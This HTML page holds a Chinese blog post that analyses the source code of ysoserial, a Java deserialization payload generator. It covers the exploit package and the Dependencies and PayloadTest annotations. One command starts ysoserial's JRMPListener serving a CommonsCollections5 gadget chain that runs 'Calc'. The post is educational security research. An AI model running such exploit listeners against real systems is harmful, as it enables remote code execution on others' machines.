<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ysoserial 是一个开源的 Java 工具，专门用于生成各种反序列化漏洞的 payload。这些 payload 可以被用来在易受攻击的 Java 应用中触发远程代码执行（RCE）漏洞。通过利用 Java 序列化机制的特性，ysoserial 构造恶意对象图，在目标应用反序列化这些对象时执行任意代码。该工具支持多种 payload 类型，适用于安全测试、漏洞验证。 源码解析参考： ysose">
<meta property="og:type" content="article">
<meta property="og:title" content="ysoserial系列(1)——源码分析">
<meta property="og:url" content="http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="cmisl_破站">
<meta property="og:description" content="ysoserial 是一个开源的 Java 工具，专门用于生成各种反序列化漏洞的 payload。这些 payload 可以被用来在易受攻击的 Java 应用中触发远程代码执行（RCE）漏洞。通过利用 Java 序列化机制的特性，ysoserial 构造恶意对象图，在目标应用反序列化这些对象时执行任意代码。该工具支持多种 payload 类型，适用于安全测试、漏洞验证。 源码解析参考： ysose">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/t01465d3d2a1a96cb2a.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805152357763.png">
<meta property="og:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20231112221509445.png">
<meta property="article:published_time" content="2024-08-04T16:00:00.000Z">
<meta property="article:modified_time" content="2025-07-17T04:05:02.613Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/t01465d3d2a1a96cb2a.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ysoserial系列(1)——源码分析</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2024/08/06/ysoserial%E7%B3%BB%E5%88%97(2)%E2%80%94%E2%80%94%E7%AE%80%E5%8D%95%E4%BA%8C%E5%BC%80/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇" href="/2024/07/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&text=ysoserial系列(1)——源码分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&title=ysoserial系列(1)——源码分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&is_video=false&description=ysoserial系列(1)——源码分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ysoserial系列(1)——源码分析&body=Check out this article: http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&title=ysoserial系列(1)——源码分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&title=ysoserial系列(1)——源码分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&title=ysoserial系列(1)——源码分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&title=ysoserial系列(1)——源码分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&name=ysoserial系列(1)——源码分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/08/05/ysoserial%E7%B3%BB%E5%88%97(1)%E2%80%94%E2%80%94%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/&t=ysoserial系列(1)——源码分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">源码解析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit%E5%8C%85"><span class="toc-number">1.1.</span> <span class="toc-text">exploit包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payloads%E5%8C%85"><span class="toc-number">1.2.</span> <span class="toc-text">payloads包</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#annnotation%E5%8C%85"><span class="toc-number">1.2.1.</span> <span class="toc-text">annnotation包</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Authors%E6%B3%A8%E8%A7%A3"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">Authors注解</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Dependencies%E6%B3%A8%E8%A7%A3"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">Dependencies注解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%B3%A8%E8%A7%A3%E5%AE%9A%E4%B9%89"><span class="toc-number">1.3.</span> <span class="toc-text">1. 注解定义</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E8%A7%A3%E5%B1%9E%E6%80%A7%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">注解属性解析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%B7%A5%E5%85%B7%E7%B1%BB%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.</span> <span class="toc-text">2. 工具类定义</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E7%B1%BB%E6%96%B9%E6%B3%95%E8%A7%A3%E6%9E%90%EF%BC%9A"><span class="toc-number">1.4.1.</span> <span class="toc-text">工具类方法解析：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.5.</span> <span class="toc-text">示例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PayloadTest%E6%B3%A8%E8%A7%A3"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">PayloadTest注解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E8%A7%A3%E5%AE%9A%E4%B9%89"><span class="toc-number">1.6.</span> <span class="toc-text">注解定义</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E8%A7%A3%E5%B1%9E%E6%80%A7%E8%A7%A3%E6%9E%90"><span class="toc-number">1.7.</span> <span class="toc-text">注解属性解析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.8.</span> <span class="toc-text">使用示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Utils%E5%8C%85"><span class="toc-number">1.8.1.</span> <span class="toc-text">Utils包</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ClassFiles%E7%B1%BB"><span class="toc-number">1.8.1.1.</span> <span class="toc-text">ClassFiles类</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-classAsFile%E6%96%B9%E6%B3%95"><span class="toc-number">1.8.1.1.1.</span> <span class="toc-text">1. classAsFile方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-classAsBytes-%E6%96%B9%E6%B3%95"><span class="toc-number">1.8.1.1.2.</span> <span class="toc-text">2. classAsBytes 方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.8.1.2.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Gadgets%E7%B1%BB"><span class="toc-number">1.8.1.3.</span> <span class="toc-text">Gadgets类</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97"><span class="toc-number">1.8.1.3.1.</span> <span class="toc-text">静态初始化块</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%B8%E9%87%8F%E5%92%8C%E5%86%85%E9%83%A8%E7%B1%BB"><span class="toc-number">1.8.1.3.2.</span> <span class="toc-text">常量和内部类</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E6%96%B9%E6%B3%95"><span class="toc-number">1.8.1.3.3.</span> <span class="toc-text">辅助方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#JavaVersion%E7%B1%BB"><span class="toc-number">1.8.1.4.</span> <span class="toc-text">JavaVersion类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PayloadRunner%E7%B1%BB"><span class="toc-number">1.8.1.5.</span> <span class="toc-text">PayloadRunner类</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Reflections%E7%B1%BB"><span class="toc-number">1.8.1.6.</span> <span class="toc-text">Reflections类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ReflectionFactory"><span class="toc-number">1.9.</span> <span class="toc-text">ReflectionFactory</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#newConstructorForSerialization"><span class="toc-number">1.10.</span> <span class="toc-text">newConstructorForSerialization</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E9%87%8A"><span class="toc-number">1.11.</span> <span class="toc-text">代码解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">1.12.</span> <span class="toc-text">工作原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BE%8B%E5%AD%90"><span class="toc-number">1.13.</span> <span class="toc-text">例子</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ObjectPayload%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.13.1.</span> <span class="toc-text">ObjectPayload接口</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Utils-%E9%9D%99%E6%80%81%E5%B7%A5%E5%85%B7%E7%B1%BB"><span class="toc-number">1.13.1.1.</span> <span class="toc-text">Utils 静态工具类</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ReleaseableObjectPayload%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.13.2.</span> <span class="toc-text">ReleaseableObjectPayload接口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#secmgr%E5%8C%85"><span class="toc-number">1.14.</span> <span class="toc-text">secmgr包</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DelegateSecurityManager%E7%B1%BB"><span class="toc-number">1.14.1.</span> <span class="toc-text">DelegateSecurityManager类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ExecCheckingSecurityManager%E7%B1%BB"><span class="toc-number">1.14.2.</span> <span class="toc-text">ExecCheckingSecurityManager类</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deserializer%E7%B1%BB"><span class="toc-number">1.15.</span> <span class="toc-text">Deserializer类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Serializer%E7%B1%BB"><span class="toc-number">1.16.</span> <span class="toc-text">Serializer类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GeneratePayload%E7%B1%BB"><span class="toc-number">1.17.</span> <span class="toc-text">GeneratePayload类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Strings%E7%B1%BB"><span class="toc-number">1.18.</span> <span class="toc-text">Strings类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">1.19.</span> <span class="toc-text">工作流程</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        ysoserial系列(1)——源码分析
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">cmisl</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-08-04T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-08-05</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>ysoserial 是一个开源的 Java 工具，专门用于生成各种反序列化漏洞的 payload。这些 payload 可以被用来在易受攻击的 Java 应用中触发远程代码执行（RCE）漏洞。通过利用 Java 序列化机制的特性，ysoserial 构造恶意对象图，在目标应用反序列化这些对象时执行任意代码。该工具支持多种 payload 类型，适用于安全测试、漏洞验证。</p>
<h2 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h2><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://springkill.github.io/2023/11/12/ysoserial%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3/">ysoserial源码详解 - SpringKill_春纱</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/229108#h2-0">ysoserial 结构分析与使用-安全客 - 安全资讯平台 (anquanke.com)</a></p>
<h3 id="exploit包"><a href="#exploit包" class="headerlink" title="exploit包"></a>exploit包</h3><p>这个包内的内容主要用于主要是开启交互式服务，对不同的目标进行实际的攻击。例如如下使用方法</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections5 <span class="string">&quot;Calc&quot;</span></span><br></pre></td></tr></table></figure>

<p>目前包含了多种利用方式JBoss、Jenkins、JMX、JRMP、JSF、RMI等。这里以JRMPListener为样例，分析该模块的编写方法。</p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/t01465d3d2a1a96cb2a.png" alt="t01465d3d2a1a96cb2a"></p>
<h3 id="payloads包"><a href="#payloads包" class="headerlink" title="payloads包"></a>payloads包</h3><p>该包下是ysoserial工具的核心，里面包含各种反序列化链，同时还有两个软件包：<code>annotation</code>和<code>util</code></p>
<p><img src="https://cmisl.oss-cn-beijing.aliyuncs.com/cmisl/image-20240805152357763.png" alt="image-20240805152357763"></p>
<h4 id="annnotation包"><a href="#annnotation包" class="headerlink" title="annnotation包"></a>annnotation包</h4><p>这个包内主要包含了一些注解相关的信息。</p>
<h5 id="Authors注解"><a href="#Authors注解" class="headerlink" title="Authors注解"></a>Authors注解</h5><p>这个文件定义了一个注解，其中包含了一些作者信息。</p>
<h5 id="Dependencies注解"><a href="#Dependencies注解" class="headerlink" title="Dependencies注解"></a>Dependencies注解</h5><blockquote>
<p>这个代码定义了一个自定义的Java注解<code>@Dependencies</code>，以及一个嵌套的静态工具类<code>Utils</code>，用于处理这个注解的信息。让我们分步解析这个代码的意义和用途。</p>
<h3 id="1-注解定义"><a href="#1-注解定义" class="headerlink" title="1. 注解定义"></a>1. 注解定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">package</span> ysoserial.payloads.annotation;</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line">&gt;<span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">&gt;<span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line">&gt;<span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line">&gt;<span class="meta">@Target(ElementType.TYPE)</span></span><br><span class="line">&gt;<span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="meta">@interface</span> Dependencies &#123;</span><br><span class="line">&gt;String[] value() <span class="keyword">default</span> &#123;&#125;;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="注解属性解析："><a href="#注解属性解析：" class="headerlink" title="注解属性解析："></a>注解属性解析：</h4><ul>
<li><code>@Target(ElementType.TYPE)</code>: 这个注解只能应用于类、接口（包括注解类型）或枚举声明。</li>
<li><code>@Retention(RetentionPolicy.RUNTIME)</code>: 这个注解在运行时保留，因此可以通过反射机制读取。</li>
<li><code>String[] value() default &#123;&#125;</code>: 注解的属性定义，这里定义了一个名为<code>value</code>的属性，它是一个字符串数组类型，默认为空数组。</li>
</ul>
<h3 id="2-工具类定义"><a href="#2-工具类定义" class="headerlink" title="2. 工具类定义"></a>2. 工具类定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Utils</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> String[] getDependencies(AnnotatedElement annotated) &#123;</span><br><span class="line">     <span class="type">Dependencies</span> <span class="variable">deps</span> <span class="operator">=</span> annotated.getAnnotation(Dependencies.class);</span><br><span class="line">     <span class="keyword">if</span> (deps != <span class="literal">null</span> &amp;&amp; deps.value() != <span class="literal">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> deps.value();</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>];</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> String[] getDependenciesSimple(AnnotatedElement annotated) &#123;</span><br><span class="line">     String[] deps = getDependencies(annotated);</span><br><span class="line">     String[] simple = <span class="keyword">new</span> <span class="title class_">String</span>[deps.length];</span><br><span class="line">     <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; simple.length; i++) &#123;</span><br><span class="line">         simple[i] = deps[i].split(<span class="string">&quot;:&quot;</span>, <span class="number">2</span>)[<span class="number">1</span>];</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> simple;</span><br><span class="line"> &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="工具类方法解析："><a href="#工具类方法解析：" class="headerlink" title="工具类方法解析："></a>工具类方法解析：</h4><ul>
<li><p><code>getDependencies</code>方法：</p>
</li>
<li><p><code>annotated</code>: 接受一个<code>AnnotatedElement</code>类型的参数，这是一个可以被注解的元素，例如类、方法、字段等。</p>
</li>
<li><p><code>deps = annotated.getAnnotation(Dependencies.class)</code>: 通过反射获取<code>Dependencies</code>注解实例。</p>
</li>
<li><p>如果注解存在且其值不为空，则返回注解的值；否则返回一个空数组。</p>
</li>
<li><p><code>getDependenciesSimple</code>方法：</p>
</li>
<li><p>通过调用<code>getDependencies</code>方法获取<code>Dependencies</code>注解的值。</p>
</li>
<li><p>对每个依赖项进行字符串分割，并返回第二部分（假设依赖项格式为<code>group:artifact</code>）。</p>
</li>
</ul>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>假设我们有一个类如下应用了<code>@Dependencies</code>注解：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="meta">@Dependencies(&#123;&quot;group:artifact1&quot;, &quot;group:artifact2&quot;&#125;)</span></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> &#123;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们可以通过以下方式来获取和处理注解的值：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">     <span class="comment">// 获取MyClass的注解信息</span></span><br><span class="line">     String[] dependencies = Dependencies.Utils.getDependencies(MyClass.class);</span><br><span class="line">     <span class="keyword">for</span> (String dep : dependencies) &#123;</span><br><span class="line">         System.out.println(dep);  <span class="comment">// 输出 &quot;group:artifact1&quot; 和 &quot;group:artifact2&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 获取简化后的依赖信息</span></span><br><span class="line">     String[] simpleDependencies = Dependencies.Utils.getDependenciesSimple(MyClass.class);</span><br><span class="line">     <span class="keyword">for</span> (String dep : simpleDependencies) &#123;</span><br><span class="line">         System.out.println(dep);  <span class="comment">// 输出 &quot;artifact1&quot; 和 &quot;artifact2&quot;</span></span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote>
<h5 id="PayloadTest注解"><a href="#PayloadTest注解" class="headerlink" title="PayloadTest注解"></a>PayloadTest注解</h5><p>用来标记gadgate是否需要被测试，是否测试的时候会引发什么异常情况之类的东西，是用来测试gadgate的。</p>
<blockquote>
<p>这段代码定义了一个名为 <code>PayloadTest</code> 的自定义注解，用于在 Java 程序中标记测试相关的信息。以下是对该注解的详细解析：</p>
<h3 id="注解定义"><a href="#注解定义" class="headerlink" title="注解定义"></a>注解定义</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">package</span> ysoserial.payloads.annotation;</span><br><span class="line"></span><br><span class="line">&gt;<span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">&gt;<span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"></span><br><span class="line">&gt;<span class="comment">/**</span></span><br><span class="line"><span class="comment">&gt;* <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment">&gt;*</span></span><br><span class="line"><span class="comment">&gt;*/</span></span><br><span class="line">&gt;<span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line">&gt;<span class="keyword">public</span> <span class="meta">@interface</span> PayloadTest &#123;</span><br><span class="line"> String <span class="title function_">skip</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String <span class="title function_">precondition</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String <span class="title function_">harness</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> String <span class="title function_">flaky</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure>

